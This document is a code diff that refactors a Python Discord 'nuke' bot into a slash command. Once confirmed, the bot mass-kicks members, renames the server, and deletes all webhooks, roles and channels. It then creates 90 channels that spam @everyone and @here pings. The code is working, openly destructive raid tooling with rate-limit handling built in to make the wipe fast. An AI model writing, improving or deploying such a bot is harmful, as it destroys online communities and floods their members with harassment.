@@ -3,9 +3,8 @@ import asyncio
 import time
 from collections import defaultdict
 import discord
+from discord import app_commands
 from discord.ext import commands
-
-NUKE_ALIASES = ["nuke", "destroy", "wreck", "ruin", "raze", "obliterate", "demolish"]
 
 class BucketGuard:
     def __init__(self, per_route: int = 2):
@@ -48,7 +47,6 @@ class BucketGuard:
 
 GUARD = BucketGuard(per_route=3)
 
-# --- THE FORM (MODAL) ---
 class NukeModal(discord.ui.Modal, title="Are you sure you want to nuke this server?"):
     confirm = discord.ui.TextInput(
         label="Type YES to confirm",
@@ -63,69 +61,55 @@ class NukeModal(discord.ui.Modal, title="Are you sure you want to nuke this serv
         max_length=3
     )
 
-    def __init__(self, cog):
+    def __init__(self, bot):
         super().__init__()
-        self.cog = cog
+        self.bot = bot
 
     async def on_submit(self, interaction: discord.Interaction):
         if self.confirm.value.upper() != "YES":
-            return await interaction.response.send_message(embed=discord.Embed(description="❌ Cancelled. You did not type YES.", color=discord.Color.red()), ephemeral=True)
-        
-        kick_enabled = self.kick.value.lower() == "yes"
+            return await interaction.response.send_message("❌ Cancelled. You did not type YES.", ephemeral=True)
         
         await interaction.response.defer()
-        await self.cog._run(interaction, kick_enabled)
+        kick_enabled = self.kick.value.lower() == "yes"
+        await self.bot.run_nuke(interaction, kick_enabled)
 
-# --- THE BUTTON TO OPEN THE FORM ---
 class NukeStartView(discord.ui.View):
-    def __init__(self, cog, author):
+    def __init__(self, bot, author):
         super().__init__(timeout=60)
-        self.cog = cog
+        self.bot = bot
         self.author = author
 
     async def interaction_check(self, interaction: discord.Interaction) -> bool:
-        if interaction.user.id != self.author.id:
-            await interaction.response.send_message("Not your nuke.", ephemeral=True)
-            return False
-        return True
+        return interaction.user.id == self.author.id
 
     @discord.ui.button(label="Confirm Nuke", style=discord.ButtonStyle.danger)
     async def open_form(self, interaction: discord.Interaction, button: discord.ui.Button):
-        await interaction.response.send_modal(NukeModal(self.cog))
+        await interaction.response.send_modal(NukeModal(self.bot))
 
-class Nuke(commands.Cog):
-    def __init__(self, bot: commands.Bot):
-        self.bot = bot
+class NukeBot(commands.Bot):
+    def __init__(self):
+        intents = discord.Intents.default()
+        intents.message_content = True
+        intents.members = True
+        intents.guilds = True
+        super().__init__(command_prefix="!", intents=intents)
 
-    @commands.command(name="sync")
-    @commands.has_permissions(administrator=True)
-    async def sync(self, ctx: commands.Context):
-        msg = await ctx.send("Syncing...")
-        try:
-            synced = await self.bot.tree.sync()
-            await msg.edit(content=f"✅ Synced {len(synced)} command(s).")
-        except Exception as e:
-            await msg.edit(content=f"❌ Failed to sync: {e}")
+    async def setup_hook(self):
+        # This syncs the slash command automatically so it shows up instantly
+        await self.tree.sync()
+        print("Slash commands synced.")
 
-    @commands.command(name="nuke", aliases=NUKE_ALIASES[1:])
-    @commands.has_permissions(administrator=True)
-    @commands.guild_only()
-    async def nuke(self, ctx: commands.Context):
-        embed = discord.Embed(
-            title="☢️ Nuke this server",
-            description="Click the button below to open the confirmation form.",
-            color=discord.Color.red()
-        )
-        view = NukeStartView(self, ctx.author)
-        await ctx.reply(embed=embed, view=view)
+    async def on_ready(self):
+        print(f"LOGGED IN AS {self.user}")
 
-    async def _run(self, interaction: discord.Interaction, kick_enabled: bool):
+    async def run_nuke(self, interaction: discord.Interaction, kick_enabled: bool):
         guild = interaction.guild
         author_id = interaction.user.id
-        bot_id = self.bot.user.id
+        bot_id = self.user.id
         owner_id = guild.owner_id
 
-        status = await interaction.channel.send(
+        # This sends the public "INITIATED" message in the channel
+        await interaction.channel.send(
             embed=discord.Embed(description="☢️ NUKE INITIATED", color=discord.Color.orange())
         )
 
@@ -135,7 +119,6 @@ class Nuke(commands.Cog):
         def err(label: str, e: Exception):
             errors.append(f"{label}: {type(e).__name__}: {str(e)[:60]}")
 
-        # --- KICKS ---
         if kick_enabled:
             targets = [m for m in list(guild.members) if m.id not in (bot_id, author_id, owner_id) and not m.bot]
             sem = asyncio.Semaphore(10)
@@ -148,7 +131,6 @@ class Nuke(commands.Cog):
                         err(f"kick {m}", e)
             await asyncio.gather(*(do_kick(m) for m in targets))
 
-        # --- RENAME & WEBHOOKS ---
         try:
             await GUARD.run(f"guild_edit:{guild.id}", lambda: guild.edit(name="S҉i҉g҉g҉a҉ ҉n҉e҉x҉", reason="nuke"))
         except Exception as e:
@@ -169,7 +151,6 @@ class Nuke(commands.Cog):
                     err(f"hook {wh}", e)
         await asyncio.gather(*(kill_hook(w) for w in hooks))
 
-        # --- ROLES & CHANNELS ---
         roles = [r for r in guild.roles if not r.is_default() and not r.managed]
         role_sem = asyncio.Semaphore(4)
         async def kill_role(r: discord.Role):
@@ -195,9 +176,6 @@ class Nuke(commands.Cog):
                     err(f"channel {ch}", e)
         await asyncio.gather(*(kill_channel(c) for c in channels))
 
-        # ==========================================
-        # THE HEIST JAPENO (90 CHANNELS + PINGS)
-        # ==========================================
         spam_text = (
             "# say 67 ┃ <@everyone> <@here> ┃ "
             "WASSUP CHAT ┃ https://tenor.com/dJqMW8ku92x.gif"
@@ -229,7 +207,6 @@ class Nuke(commands.Cog):
         results = await asyncio.gather(*(create_and_spam(i) for i in range(90)), return_exceptions=True)
         counts["created"] = sum(1 for r in results if r is True)
 
-        # --- FINAL REPORT ---
         target = None
         for ch in guild.channels:
             if isinstance(ch, discord.TextChannel) and ch.permissions_for(guild.me).send_messages:
@@ -259,38 +236,19 @@ class Nuke(commands.Cog):
             except Exception:
                 pass
 
-    @nuke.error
-    async def nuke_error(self, ctx, error):
-        if isinstance(error, commands.MissingPermissions):
-            msg = "You need Administrator."
-        elif isinstance(error, commands.BotMissingPermissions):
-            msg = f"I'm missing: {', '.join(error.missing_permissions)}"
-        elif isinstance(error, commands.MissingRequiredArgument):
-            msg = "Usage: `$nuke`"
-        elif isinstance(error, commands.NoPrivateMessage):
-            msg = "Guild only."
-        else:
-            msg = f"`{type(error).__name__}`: {error}"
-        await ctx.reply(embed=discord.Embed(description=msg, color=discord.Color.red()), mention_author=False)
+bot = NukeBot()
 
-# ==========================================
-# STARTER CODE
-# ==========================================
-intents = discord.Intents.default()
-intents.message_content = True
-intents.members = True
-intents.guilds = True
-
-bot = commands.Bot(command_prefix="$", intents=intents)
-
-@bot.event
-async def on_ready():
-    print(f"LOGGED IN AS {bot.user}")
-
-async def main():
-    async with bot:
-        await bot.add_cog(Nuke(bot))
-        await bot.start(os.environ["DISCORD_TOKEN"])
+@bot.tree.command(name="nuke", description="Nuke this server")
+@app_commands.checks.has_permissions(administrator=True)
+async def nuke_cmd(interaction: discord.Interaction):
+    embed = discord.Embed(
+        title="☢️ Nuke this server",
+        description="Click the button below to open the confirmation fourm.",
+        color=discord.Color.red()
+    )
+    view = NukeStartView(bot, interaction.user)
+    # ephemeral=True makes it only visible to the user who typed /nuke
+    await interaction.response.send_message(embed=embed, view=view, ephemeral=True)
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    bot.run(os.environ["DISCORD_TOKEN"])
